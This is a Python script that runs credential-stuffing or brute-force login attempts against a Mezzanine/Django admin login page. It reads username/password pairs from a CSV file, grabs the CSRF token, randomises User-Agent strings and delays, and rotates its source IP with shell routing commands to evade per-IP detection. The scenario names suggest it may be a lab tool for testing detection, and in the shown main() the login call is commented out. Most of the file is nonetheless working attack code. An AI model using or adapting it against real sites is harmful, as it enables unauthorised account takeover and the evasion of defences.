# -*- coding: utf-8 -*-

import configparser
import csv
import os
import random
import subprocess
import sys
from time import sleep

import ipaddr
import requests

from fake_useragent import UserAgent


def gen_ipaddr(ip_type, num):
    network = ipaddr.IPv4Network('96.0.0.0/4')
    if ip_type == "random":
        return ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))
    elif ip_type == "increment":
        return ipaddr.IPv4Address(int(network.network) + num)
    else:
        print("{} don't exsit setting. you should set random or increment. ".format(ip_type))
        sys.exit(1)


def change_ipaddr(ip_addr):
    cmd_list = (
        "ip flush dev ens224",
        "ip addr add {}/4 dev ens224".format(ip_addr),
        "ip link set ens224 up",
        "route add -net 160.17.0.0 gw 111.255.255.254 netmask 255.255.0.0 dev ens224"
    )
    for cmd in cmd_list:
        try:
            proc = subprocess.Popen(cmd, shell=True)
            proc.wait()
        except Exception as e:
            print(e)


def acccess(http_info):
    request_info = http_info
    for key in ('payload', 'headers', 'querystring'):
        if key not in http_info:
            request_info[key] = {}

    try:
        res = requests.request(
            request_info['method'],
            request_info['url'],
            data=request_info['payload'],
            headers=request_info['headers'],
            params=request_info['querystring'],
        )
        return res
    except Exception as e:
        print(e)


def interval(config):
    max_ = int(config.get('interval', 'max'))
    min_ = int(config.get('interval', 'min'))
    if max_ == min_:
        sleep(min_)
    else:
        sleep(random.uniform(min_, max_))


def attacker(user, pass_, config):
    useragent = config.get('http_headers', 'User-Agent')
    if useragent == "random":
        useragent = ua.random

    cookie = acccess({
        'method': 'GET',
        'url': config.get('general', 'url'),
        'headers': {
            'User-Agent': useragent,
            'Cookie': '',
            'Referer': '',
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'text/html; charset=utf-8',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    }).cookies['csrftoken']
    interval(config)

    res = acccess({
        'method': 'POST',
        'url': config.get('general', 'url'),
        'querystring': {'next': '/ja/admin'},
        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
        'headers': {
            'User-Agent': useragent,
            'Cookie': 'csrftoken={}'.format(cookie),
            'Referer': config.get('http_headers', 'referer'),
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    })
    if res is not None:
        if "ダッシュボード" in res.text:
            result = "Succeeded"
        else:
            result = "Failed"
        print("User: {}, Pass: {}, Result: {}".format(user, pass_, result))
    else:
        print("response doesn't exsit. maybe, one or more http-headers are wrong.")
    interval(config)


def ipchange_test(scenario, num):
    count = 10
    if scenario == "test1":
        ip = gen_ipaddr("random", num)
        print(ip, num)
    elif scenario == "test2":
        ip = gen_ipaddr("increment", num)
        print(ip, num)
    elif scenario == "test3":
        if (num % count) == 0:
            ip = gen_ipaddr("random", (num // count))
            print(ip, num)
    elif scenario == "test4":
        if (num % count) == 0:
            ip = gen_ipaddr("increment", (num // count))
            print(ip, num)
    elif scenario == "test5":
        if (num % random.randint(1, 20)) == 0:
            ip = gen_ipaddr("random", (num // count))
            print(ip, num)
    elif scenario == "test6":
        if (num % count) == 0:
            ip = gen_ipaddr("increment", (num // count))
            print(ip, num)


def main():
    config = configparser.SafeConfigParser()
    config.read((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attacker.conf'))))
    try:
        scenario = config.get('general', 'scenario')
    except Exception as e:
        print(e)

    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
        reader = csv.reader(f)
        if config.get('general', 'account') == "username":
            account = 0
        elif config.get('general', 'account') == "email":
            account = 1
        else:
            print("Warn: don't exsit setting and so, set username account")
            account = 0
        for row in reader:
            #attacker(str(row[account]), str(row[2]), config)
            if 'scenario' in locals():
                ipchange_test(scenario, reader.line_num)


if __name__ == '__main__':
    main()
